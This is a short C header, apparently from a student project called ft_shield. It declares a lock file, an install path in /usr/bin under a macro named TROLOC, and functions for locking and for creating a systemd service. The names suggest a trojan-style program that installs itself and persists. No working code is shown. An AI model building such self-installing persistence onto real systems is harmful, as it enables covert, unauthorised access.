#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/file.h>
#include <signal.h>

#define LOCKLOC "/var/lock/ft_shield.lock"

#define TROLOC "/usr/bin/ft_shield"

#ifndef LOGIN
# define LOGIN "cgodard"
#endif

extern char **environ;

// lock.c
int		is_locked(void);
void	create_lock(void);
void	delete_lock_at_exit(void);

// systemd.c
void	create_systemd_service(void);
